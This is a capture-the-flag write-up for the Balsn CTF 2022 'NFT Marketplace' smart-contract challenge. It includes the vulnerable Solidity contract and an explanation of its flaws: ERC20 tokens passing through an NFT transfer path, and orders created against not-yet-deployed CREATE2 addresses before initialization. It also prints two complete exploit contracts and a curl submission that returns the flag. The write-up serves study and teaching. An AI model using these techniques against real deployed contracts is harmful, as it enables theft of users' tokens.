# NFT Marketplace [10 solves] [358 points]

### Description :  
```  
Simple NFT Marketplace

http://nft-marketplace.balsnctf.com:3000/

Author: ysc  
```

Two files were given, the contract `NFTMarketplace.sol`, and the hardhat
configuration `hardhat.config.js`.

The objective of this challenge is to own all 4 NFTs and draining the NMToken
balance of the marketplace contract

### Contract :  
```solidity  
// SPDX-License-Identifier: UNLICENSED  
pragma solidity 0.8.9;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";  
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract RareNFT is ERC721 {  
   bool _lock = false;

   constructor(string memory name, string memory symbol) ERC721(name, symbol)
{}

   function mint(address to, uint256 tokenId) public {  
       require(!_lock, "Locked");  
       _mint(to, tokenId);  
   }

   function lock() public {  
       _lock = true;  
   }  
}

contract NMToken is ERC20 {  
   bool _lock = false;  
   address admin;

   constructor(string memory name, string memory symbol) ERC20(name, symbol) {  
       admin = msg.sender;  
   }

   function mint(address to, uint256 amount) public {  
       // shh - admin function  
       require(msg.sender == admin, "admin only");  
       _mint(to, amount);  
   }

   function move(address from, address to, uint256 amount) public {  
       // shh - admin function  
       require(msg.sender == admin, "admin only");  
       _transfer(from, to, amount);  
   }

   function lock() public {  
       _lock = true;  
   }  
}

contract NFTMarketplace {  
   error TransferFromFailed();  
   event GetFlag(bool success);

   bool public initialized;  
   bool public tested;  
   RareNFT public rareNFT;  
   NMToken public nmToken;  
   Order[] public orders;

   struct Order {  
       address maker;  
       address token;  
       uint256 tokenId;  
       uint256 price;  
   }

   constructor() {  
   }

   function initialize() public {  
       require(!initialized, "Initialized");  
       initialized = true;

       nmToken = new NMToken{salt: keccak256("NMToken")}("NM Token", "NMToken");  
       nmToken.mint(address(this), 1000000);  
       nmToken.mint(msg.sender, 100);  
       nmToken.lock();  
       nmToken.approve(address(this), type(uint256).max);

       rareNFT = new RareNFT{salt: keccak256("rareNFT")}("Rare NFT", "rareNFT");  
       rareNFT.mint(address(this), 1);  
       rareNFT.mint(address(this), 2);  
       rareNFT.mint(address(this), 3);  
       rareNFT.mint(msg.sender, 4);  
       rareNFT.lock();

       // NFTMarketplace(this).createOrder(address(rareNFT), 1, 10000000000000);  // I think it's super rare.  
       NFTMarketplace(this).createOrder(address(rareNFT), 2, 100);  
       NFTMarketplace(this).createOrder(address(rareNFT), 3, 100000);  
   }

   function getTokenVersion() public pure returns (bytes memory) {  
       return type(NMToken).creationCode;  
   }

   function getNFTVersion() public pure returns (bytes memory) {  
       return type(RareNFT).creationCode;  
   }

   function createOrder(address token, uint256 tokenId, uint256 price) public
returns(uint256) {  
       orders.push(Order(msg.sender, token, tokenId, price));  
       _safeTransferFrom(token, msg.sender, address(this), tokenId);  
       return orders.length - 1;  
   }

   function cancelOrder(uint256 orderId) public {  
       require(orderId < orders.length, "Invalid orderId");  
       Order memory order = orders[orderId];  
       require(order.maker == msg.sender, "Invalid maker");  
       _deleteOrder(orderId);  
       _safeTransferFrom(order.token, address(this), order.maker, order.tokenId);  
   }

   function fulfill(uint256 orderId) public {  
       require(orderId < orders.length, "Invalid orderId");  
       Order memory order = orders[orderId];  
       require(order.maker != address(0), "Invalid maker");  
       _deleteOrder(orderId);  
       nmToken.move(msg.sender, order.maker, order.price);  
       _safeTransferFrom(order.token, address(this), msg.sender, order.tokenId);  
   }

   function fulfillTest(address token, uint256 tokenId, uint256 price) public
{  
       require(!tested, "Tested");  
       tested = true;  
       uint256 orderId = NFTMarketplace(this).createOrder(token, tokenId, price);  
       fulfill(orderId);  
   }

   function verify() public {  
       require(nmToken.balanceOf(address(this)) == 0, "failed");  
       require(nmToken.balanceOf(msg.sender) > 1000000, "failed");  
       require(rareNFT.ownerOf(1) == msg.sender && rareNFT.ownerOf(2) == msg.sender && rareNFT.ownerOf(3) == msg.sender && rareNFT.ownerOf(4) == msg.sender);  
       emit GetFlag(true);  
   }

   function _safeTransferFrom(  
       address token,  
       address from,  
       address to,  
       uint256 tokenId  
   ) internal {  
       bool success;  
       bytes memory data;

       assembly {  
           // we'll write our calldata to this slot below, but restore it later  
           let memPointer := mload(0x40)  
           // write the abi-encoded calldata into memory, beginning with the function selector  
           mstore(0, 0x23b872dd00000000000000000000000000000000000000000000000000000000)  
           mstore(4, from) // append the 'from' argument  
           mstore(36, to) // append the 'to' argument  
           mstore(68, tokenId) // append the 'tokenId' argument

           success := and(  
               // set success to whether the call reverted, if not we check it either  
               // returned exactly 1 (can't just be non-zero data), or had no return data  
               or(and(eq(mload(0), 1), gt(returndatasize(), 31)), iszero(returndatasize())),  
               // we use 100 because that's the total length of our calldata (4 + 32 * 3)  
               // - counterintuitively, this call() must be positioned after the or() in the  
               // surrounding and() because and() evaluates its arguments from right to left  
               call(gas(), token, 0, 0, 100, 0, 32)  
           )  
           data := returndatasize()

           mstore(0x60, 0) // restore the zero slot to zero  
           mstore(0x40, memPointer) // restore the memPointer  
       }  
       if (!success) revert TransferFromFailed();  
   }

   function _deleteOrder(uint256 orderId) internal {  
       orders[orderId] = orders[orders.length - 1];  
       orders.pop();  
   }  
}  
```

### Briefly explaining what the contract does :

First, there's a RareNFT contract which is ERC721 contract with a lock
implemented, after it's locked, the minting function will be disabled.

There's also a NMToken contract which is a ERC20 contract, it also has the
lock function like RareNFT. However the minting function will not read the
lock at all, even if it's locked, the admin can still mint NFT.

NMToken contract also has a `move()` function, which allows the admin to
arbitarily transfer anyone's token.

For the NFTMarketplace, there's an `initialize()` function, which will deploy
RareNFT and NMToken contract with the salt, and mint 1000000 NMTokens for the
marketplace itself and 100 to the caller. Then it mint NFT id 1-3 to the
marketplace and NFT id 4 to the caller. After all minting is done, it lock
both RareNFT and NMToken contract. Finally, it create order for NFT id 2,3.

There's `createOrder()` to let sellers create an order and transfer their NFT
to the marketplace with the `_safeTransferFrom()` function, and there's
`fulfill()` to let buyers to pay for the orders with NMTokens to buy NFT.

The `_safeTransferFrom()` has an assembly block which make a call with
`0x23b872dd` as the function identifier, which is calling the `transferFrom()`
function, it's supposed to be used for ERC721, but it can also be used for
ERC20 if we passed in an ERC20 contract address as the `token` parameter.

### How to steal either RareNFT or NMToken form the marketplace :

There's a `fulfillTest()` function, which can only be used once. The
marketplace contract will call itself to create order as the marketplace, and
then fulfill the order as the caller.

As it calls `createOrder()` as the marketplace, so we can control the
parameter to arbitarily create order as the marketplace, such as selling
RareNFT or even NMToken.

For example stealing NFT id 1, the marketplace did not create order during the
initialization, so we can just create an order as the marketplace using
`fulfillTest()` and set the price to 0 NMToken, then it will fulfill the order
as the caller, so the caller will own NFT id 1 after the function call.

We can also pass in the address for the NMToken contract, and create an order
for ERC20 as the marketplace, and set the amount of ERC20 as the tokenid
parameter. Then the caller can steal the NMToken of the marketplace.

However `fulfillTest()` alone could not solve the challenge, as we need to
drain the marketplace as well as owning all NFTs, `fulfillTest()` can either
steal NMToken for once or stealing one NFT, as it can only be called once.

### How the challenge can be solved :

There is another problem with the marketplace contract, which is the
`initialize()` function. After the contract is deployed, it is not
initialized, and the user is going to initialize it.

If we create order after the initialization, we can not create an order of
RareNFT that we don't have, or create an order of NMToken that the amount is
more than our balance as `_safeTransferFrom()` will fail and revert the
transaction.

But if we precompute the address of the RareNFT/NMToken contract and create
order before initialization, we can create whatever order we want. As the
RareNFT/NMToken contract is not deployed yet, the address has no code, and it
won't revert transaction for whatever calldata we pass in.

So we can create order for stealing NMToken to buy NFT id 2,3 and drain the
remaining NMToken of the marketplace before the initialization.

Then initialize the marketplace, fulfill the first order to drain all NMTokens
from the marketplace, and buy NFT id 2,3 with stolen NMTokens, and when we buy
the NFTs some NMTokens will be transfer back to the marketplace, so fulfill
the second order to drain the marketplace NMToken balance to 0.

Finally, steal the remaining NFT id 1 using `fulfillTest()`, and NFT id 4 is
minted to us, so there's nothing we need to do with it. Then owned all NFTs
and owned all NMTokens, and the challenge is solved.

### Exploit contract 1 :

```solidity  
// SPDX-License-Identifier: UNLICENSED  
pragma solidity 0.8.9;

import "./NFTMarketplace.sol";

contract UserContract {  
  
   function getBytecode(address _target) public pure returns (bytes memory) {  
       NFTMarketplace marketplace = NFTMarketplace(_target);  
       bytes memory bytecode = marketplace.getTokenVersion();  
       return abi.encodePacked(bytecode, abi.encode("NM Token", "NMToken"));  
   }  

   function getAddress(address _target)  
       public  
       view  
       returns (address)  
   {  
       bytes32 hash = keccak256(  
           abi.encodePacked(bytes1(0xff), _target, keccak256("NMToken"), keccak256(getBytecode(_target)))  
       );

       // NOTE: cast last 20 bytes of hash to address  
       return address(uint160(uint(hash)));  
   }

   address public nmtoken_addr;

   function execute(address target) public {  
       NFTMarketplace marketplace = NFTMarketplace(target);  
  
       // Precompute nmtoken address  
       nmtoken_addr = getAddress(target);

       // Create order for erc20 contract before its initialized, so it won't revert even we set amount to more than we have  
       // So we can steal erc20 token from the marketplace after its initialized  
       marketplace.createOrder(nmtoken_addr, 1000000, 0);  // order 0  
       marketplace.createOrder(nmtoken_addr, 100100, 0);   // order 1

       marketplace.initialize();

       // Steal 1000000 erc20 using the created order before initialization  
       marketplace.fulfill(0);

       // Buy nft id 2/3  
       // The delete order will move last order in the list to the position of the deleted order  
       // So nft id 3 originally is on order 3, now its order 0, as 0 is deleted above  
       marketplace.fulfill(0);

       // Then nft id 2's order will become 0, as its the last before we fulfill the order of nft id 3  
       marketplace.fulfill(0);

       // Drain marketplace erc20 balance to 0 again, using the 100100 order we created earlier  
       // Its moved to order 0 now  
       marketplace.fulfill(0);

       // Steal nft tokenid 1  
       marketplace.fulfillTest(address(marketplace.rareNFT()), 1, 0);  
  
       marketplace.verify();  
   }  
}  
```

### Flag :  
Just compile the exploit contract and send the bytecode to the server and get
the flag :  
```  
curl -v http://nft-marketplace.balsnctf.com:3000/exploit -X POST --header
"Content-Type: application/json" -d '{"bytecode":
"0x608060405234801561001057600080fd5b506108a6806100206000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80630c6008af146100515780634b64e4921461007a578063ae22c57d1461008f578063dcf6a8a4146100ba575b600080fd5b61006461005f3660046106c1565b6100cd565b6040516100719190610715565b60405180910390f35b61008d6100883660046106c1565b6101cf565b005b6100a261009d3660046106c1565b610607565b6040516001600160a01b039091168152602001610071565b6000546100a2906001600160a01b031681565b606060008290506000816001600160a01b031663a5a621cf6040518163ffffffff1660e01b815260040160006040518083038186803b15801561010f57600080fd5b505afa158015610123573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f1916820160405261014b919081019061075e565b905080604051602001610199906040808252600890820152672726902a37b5b2b760c11b6060820152608060208201819052600790820152662726aa37b5b2b760c91b60a082015260c00190565b60408051601f19818403018152908290526101b7929160200161080b565b60405160208183030381529060405292505050919050565b806101d981610607565b600080546001600160a01b0319166001600160a01b03928316908117825560405163acfee8ed60e01b81526004810191909152620f4240602482015260448101919091529082169063acfee8ed90606401602060405180830381600087803b15801561024457600080fd5b505af1158015610258573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061027c919061083a565b506000805460405163acfee8ed60e01b81526001600160a01b039182166004820152620187046024820152604481019290925282169063acfee8ed90606401602060405180830381600087803b1580156102d557600080fd5b505af11580156102e9573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061030d919061083a565b50806001600160a01b0316638129fc1c6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561034957600080fd5b505af115801561035d573d6000803e3d6000fd5b505060405163753b880760e01b8152600060048201526001600160a01b038416925063753b88079150602401600060405180830381600087803b1580156103a357600080fd5b505af11580156103b7573d6000803e3d6000fd5b505060405163753b880760e01b8152600060048201526001600160a01b038416925063753b88079150602401600060405180830381600087803b1580156103fd57600080fd5b505af1158015610411573d6000803e3d6000fd5b505060405163753b880760e01b8152600060048201526001600160a01b038416925063753b88079150602401600060405180830381600087803b15801561045757600080fd5b505af115801561046b573d6000803e3d6000fd5b505060405163753b880760e01b8152600060048201526001600160a01b038416925063753b88079150602401600060405180830381600087803b1580156104b157600080fd5b505af11580156104c5573d6000803e3d6000fd5b50505050806001600160a01b0316636c676b7f826001600160a01b0316632ab6861f6040518163ffffffff1660e01b815260040160206040518083038186803b15801561051157600080fd5b505afa158015610525573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105499190610853565b6040516001600160e01b031960e084901b1681526001600160a01b0390911660048201526001602482015260006044820152606401600060405180830381600087803b15801561059857600080fd5b505af11580156105ac573d6000803e3d6000fd5b50505050806001600160a01b031663fc735e996040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156105eb57600080fd5b505af11580156105ff573d6000803e3d6000fd5b505050505050565b6000806001600160f81b0319837fbf4aa97203733fbfd565de6a80bca9538746b7a8802f1de294a724399a8a261d61063e826100cd565b805160209182012060405161068a95949392016001600160f81b031994909416845260609290921b6bffffffffffffffffffffffff191660018401526015830152603582015260550190565b60408051601f1981840301815291905280516020909101209392505050565b6001600160a01b03811681146106be57600080fd5b50565b6000602082840312156106d357600080fd5b81356106de816106a9565b9392505050565b60005b838110156107005781810151838201526020016106e8565b8381111561070f576000848401525b50505050565b60208152600082518060208401526107348160408501602087016106e5565b601f01601f19169190910160400192915050565b634e487b7160e01b600052604160045260246000fd5b60006020828403121561077057600080fd5b815167ffffffffffffffff8082111561078857600080fd5b818401915084601f83011261079c57600080fd5b8151818111156107ae576107ae610748565b604051601f8201601f19908116603f011681019083821181831017156107d6576107d6610748565b816040528281528760208487010111156107ef57600080fd5b6108008360208301602088016106e5565b979650505050505050565b6000835161081d8184602088016106e5565b8351908301906108318183602088016106e5565b01949350505050565b60006020828403121561084c57600080fd5b5051919050565b60006020828403121561086557600080fd5b81516106de816106a956fea264697066735822122027b3085ee08fb3c61654db5b6b110db2ab64e90bd11a7908f15fd023c8a054ec64736f6c63430008090033"}'  
Note: Unnecessary use of -X or --request, POST is already inferred.  
*   Trying 3.239.61.106:3000...  
* Connected to nft-marketplace.balsnctf.com (3.239.61.106) port 3000 (#0)  
> POST /exploit HTTP/1.1  
> Host: nft-marketplace.balsnctf.com:3000  
> User-Agent: curl/7.74.0  
> Accept: */*  
> Content-Type: application/json  
> Content-Length: 4510  
>  
* upload completely sent off: 4510 out of 4510 bytes  
* Mark bundle as not supporting multiuse  
< HTTP/1.1 200 OK  
< X-Powered-By: Express  
< Content-Type: text/html; charset=utf-8  
< Content-Length: 39  
< ETag: W/"27-7taGCupXcCla7l0vnnjZ3XYiQZU"  
< Date: Sat, 03 Sep 2022 16:41:13 GMT  
< Connection: keep-alive  
< Keep-Alive: timeout=5  
<  
* Connection #0 to host nft-marketplace.balsnctf.com left intact  
BALSN{safeTransferFrom_ERC20_to_ERC721}  
```

### Cleaner solution :

After the challenge is solved, my teammate suggested a cleaner way to solve
this challenge.

Actually, we don't need to use `fulfillTest()` at all, and we don't need to
buy NFT id 2,3 on the order it set on the initialization, we can archieve
everything by creating orders before initialization.

We will create 4 orders in total with 0 NMToken as price before the
initialization.

First, create an order to steal all 1000000 NMTokens from the marketplace.

Then, create 3 orders to steal NFT id 1,2 and 3.

After the initialization, just fulfill all 4 orders we created, then the
challenge is solved.

### Exploit contract 2 :

```solidity  
// SPDX-License-Identifier: UNLICENSED  
pragma solidity 0.8.9;

import "./NFTMarketplace.sol";

contract UserContract {  
  
   function getBytecode(address _target) public pure returns (bytes memory) {  
       NFTMarketplace marketplace = NFTMarketplace(_target);  
       bytes memory bytecode = marketplace.getTokenVersion();  
       return abi.encodePacked(bytecode, abi.encode("NM Token", "NMToken"));  
   }  

   function getAddress(address _target)  
       public  
       view  
       returns (address)  
   {  
       bytes32 hash = keccak256(  
           abi.encodePacked(bytes1(0xff), _target, keccak256("NMToken"), keccak256(getBytecode(_target)))  
       );  
       return address(uint160(uint(hash)));  
   }

   function getBytecode2(address _target) public pure returns (bytes memory) {  
       NFTMarketplace marketplace = NFTMarketplace(_target);  
       bytes memory bytecode = marketplace.getNFTVersion();  
       return abi.encodePacked(bytecode, abi.encode("Rare NFT", "rareNFT"));  
   }  

   function getAddress2(address _target)  
       public  
       view  
       returns (address)  
   {  
       bytes32 hash = keccak256(  
           abi.encodePacked(bytes1(0xff), _target, keccak256("rareNFT"), keccak256(getBytecode2(_target)))  
       );  
       return address(uint160(uint(hash)));  
   }

   address public nmtoken_addr;  
   address public rarenft_addr;

   function execute(address target) public {  
       NFTMarketplace marketplace = NFTMarketplace(target);  
  
       nmtoken_addr = getAddress(target);  
       rarenft_addr = getAddress2(target);

       marketplace.createOrder(nmtoken_addr, 1000000, 0);  
       marketplace.createOrder(rarenft_addr, 1, 0);  
       marketplace.createOrder(rarenft_addr, 2, 0);  
       marketplace.createOrder(rarenft_addr, 3, 0);

       marketplace.initialize();

       marketplace.fulfill(0);  
       marketplace.fulfill(1);  
       marketplace.fulfill(2);  
       marketplace.fulfill(2);  
  
       marketplace.verify();  
   }  
}  
```

Original writeup (https://github.com/Kaiziron/balsn-
ctf-2022-writeup/blob/main/nft_marketplace.md).